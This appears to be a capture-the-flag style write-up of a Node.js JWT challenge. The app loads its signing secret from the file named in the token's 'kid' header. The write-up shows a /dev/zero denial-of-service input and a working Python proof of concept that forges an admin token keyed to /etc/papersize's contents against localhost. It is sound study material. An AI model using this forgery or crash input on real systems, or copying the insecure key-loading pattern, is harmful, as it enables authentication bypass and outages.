# Code
This was a great opportunity for me to get started into node.js. I have been avoiding it like the plague, but it seems like humanity will go down in flames when npm breaks anyway.

A perfect opportunity to learn some node and repeat some jwt skills (I did some webpush stuff ages ago by hand.)

Lets get started and install what we need.
```bash
apt install node npm
npm install jsonwebtoken express cookie-parser
```

Lets copy down the code and add some logging.
```js
const fs = require('fs');
var jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const app = require('express')();
app.use(cookieParser());


app.use((req, res, next) => {
        const token = req.cookies.session;
        if (!token) return res.sendStatus(403);

        jwt.verify(token,
                // getSecretKey(header, cb)
                (header, cb) => {
                        console.log(header.kid);
                        console.log(fs.readFileSync(header.kid));
                        cb(null, fs.readFileSync(header.kid));
                } , {algorithm: 'HS256'}, (err, data) => {
                        // is_valid(err, data)
                        console.log(err);
                        if(err) return res.sendStatus(403);
                        req.name = data.name;
                        return next();
                });
});


app.get('/protected', (req, res) => {
        if(req.name !== 'admin') return res.sendStatus(401);
        res.send('You are the admin!');
});

app.listen(8000);

```


Realizing it reads the secret from the file in header.kid. We do some testing.

Crafting in jwt.io
![[/assets/Pasted image 20230127100003.png]]

and doing a test with known file and contents.
![[/assets/Pasted image 20230127100231.png]]







# Bonus: Denial of Service

Sending kid: /dev/zero crashes the server.

```
kastberg@5CD9245KLN:/mnt/c/Users/robin.kastberg/hax/intigriti$ node 2023-01-23.js
/dev/zero
Segmentation fault (core dumped)
```

# Finding file with known contents.

```bash
$ find /etc -type f -size -10c -size +1c
/etc/debian_version
/etc/host.conf
/etc/mysql/conf.d/mysql.cnf
/etc/papersize
/etc/samba/gdbcommands
find: ‘/etc/ssl/private’: Permission denied
$ cat /etc/papersize
a4
$ cat /etc/papersize |xxd
00000000: 6134 0a                                  a4.
$ cat /etc/papersize |base64
YTQK
```
For some reason I didn't get this to work in jwt.io using base64 encoded secret. Not sure why.

Doing it in python however worked fine:
# POC or ....
```python
import json
import base64
import sys
import hmac
import hashlib
import requests

sizes = [b"a4", b"letter"]
for size in sizes:
    size = size + b"\n"
    h = {"alg": "HS256", "kid": "/etc/papersize"}
    d = {"name": "admin"}
    h = base64.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b"=")
    d = base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=")
    token = h+b"."+d
    s = hmac.new(size, token, hashlib.sha256).digest()
    token += b"." + base64.urlsafe_b64encode(s).rstrip(b"=")
    res = requests.get("http://localhost:8000/protected",
            cookies={"session": token.decode("ascii")})
    if(res.status_code == 200):
        print(token)
        print(res.text)
```
